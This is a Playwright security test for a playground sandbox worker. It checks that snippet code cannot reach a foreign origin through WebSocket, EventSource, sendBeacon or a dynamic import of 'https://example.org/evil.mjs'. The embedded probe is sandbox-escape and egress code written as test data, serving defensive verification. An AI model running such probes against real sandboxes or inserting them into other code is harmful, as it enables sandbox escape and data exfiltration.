import { expect, test } from '@playwright/test';

/**
 * SEC-04 (SANDBOX-SECURITY-CHECKLIST §1 "No real egress") — non-HTTP / raw-socket
 * egress is unreachable from sandboxed code. The in-Worker `fetch` is the sim shim
 * (proved by sandbox-egress / sandbox-trace), but a snippet could still try to open
 * a socket OUTSIDE `fetch`: a `WebSocket`, an `EventSource`, `navigator.sendBeacon`,
 * or a dynamic `import('https://…')`. SEC-04 requires each to be `undefined`/throw/
 * sandbox-404 AND for **zero** real connections to leave after attempting all of them.
 *
 * Driving level: option (b) — drive the REAL production worker bundle
 * (`/sandbox/sandbox-worker.mjs`) via its `{type:'run', js}` protocol, exactly like
 * sandbox-trace.spec.ts. SEC-04 is a property of the worker SCOPE + the worker's own
 * CSP (`connect-src 'self'`, served on /sandbox/* in dev AND prod), not of the runner's
 * main-thread kill loop — so the raw worker is the most honest surface, and the
 * `page.on('request', …)` spy is the same backstop sandbox-egress.spec.ts uses. The
 * spy is the security proof: even if a probe is mis-shimmed, a real connection to the
 * foreign origin would be recorded and fail the test.
 *
 * Two layers of defence are asserted together:
 *   - SCOPE: `WebSocket`/`EventSource` are shadowed to `undefined` in snippet scope
 *     (worker-entry.ts denies these escape hatches by binding them as `undefined`);
 *     `navigator` is also unavailable in the module worker, so `sendBeacon` can't fire.
 *   - CSP backstop: a dynamic `import('https://…')` is NOT shadowed, so it relies on the
 *     Worker CSP (`script-src 'self'`) to refuse loading the foreign module.
 *
 * What "no real connection" means here (the honest measure): SEC-04 requires that none
 * of these *opens a real connection*. A CSP-refused request is rejected by the browser
 * BEFORE a socket reaches the origin — it surfaces as a `requestfailed` (errorText
 * `csp`), never a completed `response`/`requestfinished`. So the spy asserts on
 * COMPLETION, not initiation: zero finished connections / responses from the foreign
 * origin, and the import attempt (if the browser logged one) was CSP-blocked. (The bare
 * `request` event fires for the *attempt* even when the browser then blocks it, which is
 * why this distinguishes a blocked attempt from a completed leak.)
 */

const FOREIGN = 'https://example.org';

test.describe('playground sandbox non-HTTP egress (SEC-04)', () => {
    test('WebSocket / EventSource / sendBeacon / dynamic import open no real connection', async ({
        page,
    }) => {
        await page.goto('/playground');

        const isForeign = (url: string): boolean => {
            try {
                return new URL(url).origin === FOREIGN;
            } catch {
                return false;
            }
        };

        // A COMPLETED connection to the foreign origin is a real leak — a finished
        // request or any response means bytes crossed. (CSP-refused attempts never
        // finish and never produce a response.)
        const completed: string[] = [];
        page.on('requestfinished', (r) => {
            if (isForeign(r.url())) completed.push('finished ' + r.url());
        });
        page.on('response', (resp) => {
            if (isForeign(resp.url()))
                completed.push('response ' + resp.status() + ' ' + resp.url());
        });
        // Attempts the browser REFUSED (CSP/network) — recorded so we can assert the
        // foreign import was actually blocked, not merely never attempted.
        const blocked: string[] = [];
        page.on('requestfailed', (r) => {
            if (isForeign(r.url()))
                blocked.push(
                    'failed ' +
                        r.url() +
                        ' :: ' +
                        (r.failure()?.errorText ?? '?'),
                );
        });

        // The probe runs INSIDE the real worker: it attempts all four non-HTTP
        // egress channels against a foreign origin and reports a verdict per channel.
        // Each attempt is wrapped so a throw/undefined is captured as "blocked", never
        // crashing the run. The worker posts the verdict back as the run's `value`.
        const js = `
            const out = {};

            // 1) WebSocket — shadowed to undefined in snippet scope (SEC-30/04).
            out.webSocketType = typeof WebSocket;
            try {
                // Referencing the (undefined) binding and calling it must NOT open a
                // socket; it throws synchronously and is contained.
                const ws = new WebSocket('${FOREIGN.replace('https', 'wss')}/sock');
                out.webSocket = 'CONSTRUCTED'; // would be a leak
                try { ws.close(); } catch {}
            } catch (e) {
                out.webSocket = 'BLOCKED:' + (e && e.name);
            }

            // 2) EventSource — shadowed to undefined in snippet scope (SEC-30/04).
            out.eventSourceType = typeof EventSource;
            try {
                const es = new EventSource('${FOREIGN}/sse');
                out.eventSource = 'CONSTRUCTED'; // would be a leak
                try { es.close(); } catch {}
            } catch (e) {
                out.eventSource = 'BLOCKED:' + (e && e.name);
            }

            // 3) navigator.sendBeacon — NOT shadowed (worker global still has it);
            //    the Worker CSP connect-src 'self' must refuse the beacon. sendBeacon
            //    returns false when the URL is disallowed by policy (it never throws).
            try {
                const nav = typeof navigator !== 'undefined' ? navigator : undefined;
                out.sendBeaconType = nav ? typeof nav.sendBeacon : 'no-navigator';
                if (nav && typeof nav.sendBeacon === 'function') {
                    out.sendBeaconResult = nav.sendBeacon('${FOREIGN}/beacon', 'x');
                } else {
                    out.sendBeaconResult = 'unavailable';
                }
            } catch (e) {
                out.sendBeaconResult = 'BLOCKED:' + (e && e.name);
            }

            // 4) dynamic import of a remote URL — the Worker CSP script-src 'self'
            //    must refuse loading a foreign module; the import rejects, no socket.
            try {
                await import('${FOREIGN}/evil.mjs');
                out.dynamicImport = 'LOADED'; // would be a leak
            } catch (e) {
                out.dynamicImport = 'BLOCKED:' + (e && e.name);
            }

            return out;
        `;

        const result = await page.evaluate(
            async ({ source, workerUrl }) => {
                const worker = new Worker(workerUrl, { type: 'module' });
                try {
                    return await new Promise<{
                        value?: Record<string, unknown>;
                        error?: { name: string; message: string };
                    }>((resolve, reject) => {
                        const timer = setTimeout(
                            () => reject(new Error('worker run timed out')),
                            15000,
                        );
                        worker.onmessage = (ev: MessageEvent) => {
                            const d = ev.data as {
                                type: string;
                                value?: Record<string, unknown>;
                                error?: { name: string; message: string };
                            };
                            // Ignore progress; settle on the single terminal result.
                            if (d.type === 'result') {
                                clearTimeout(timer);
                                resolve({ value: d.value, error: d.error });
                            }
                        };
                        worker.onerror = (e: ErrorEvent) =>
                            reject(new Error(e.message || 'worker error'));
                        worker.postMessage({
                            type: 'run',
                            js: source,
                            extraScopeNames: [],
                        });
                    });
                } finally {
                    worker.terminate();
                }
            },
            { source: js, workerUrl: '/sandbox/sandbox-worker.mjs' },
        );

        // The probe completed without the snippet itself throwing (each channel was
        // contained inside its own try/catch and reported a verdict).
        expect(
            result.error,
            'the probe snippet must not error out',
        ).toBeUndefined();
        const v = result.value as Record<string, unknown>;
        expect(v, 'probe returned a verdict object').toBeTruthy();

        // SCOPE layer: WebSocket / EventSource are not even constructible.
        expect(v.webSocketType, 'WebSocket is undefined in snippet scope').toBe(
            'undefined',
        );
        expect(
            String(v.webSocket),
            'WebSocket construction blocked (no socket)',
        ).toContain('BLOCKED');
        expect(
            v.eventSourceType,
            'EventSource is undefined in snippet scope',
        ).toBe('undefined');
        expect(
            String(v.eventSource),
            'EventSource construction blocked (no socket)',
        ).toContain('BLOCKED');

        // CSP backstop layer: sendBeacon refused (false / blocked / unavailable),
        // never a successful queued beacon to the foreign origin.
        expect(
            v.sendBeaconResult,
            'sendBeacon must not successfully queue a foreign beacon',
        ).not.toBe(true);

        // CSP backstop layer: a remote dynamic import rejects — no module loaded.
        expect(
            String(v.dynamicImport),
            'remote dynamic import must be blocked',
        ).toContain('BLOCKED');

        // Allow any late network events (the import attempt's failure) to flush.
        await page.waitForTimeout(500);

        // THE SECURITY PROOF: after attempting all four channels, ZERO real
        // connections COMPLETED to the foreign origin — no finished request, no
        // response, no bytes. A CSP-refused attempt never reaches this list.
        expect(
            completed,
            `no real connection may COMPLETE to ${FOREIGN} (saw: ${completed.join(', ')})`,
        ).toHaveLength(0);

        // And the one channel the browser DOES attempt at the network layer (the
        // dynamic import) was refused by CSP — proving the backstop actively blocked
        // it rather than the request simply never being made. (errorText is `csp`.)
        expect(
            blocked.some((b) => b.includes('evil.mjs')),
            `the foreign import must be CSP-blocked at the network layer (failed: ${blocked.join(', ')})`,
        ).toBe(true);
    });
});
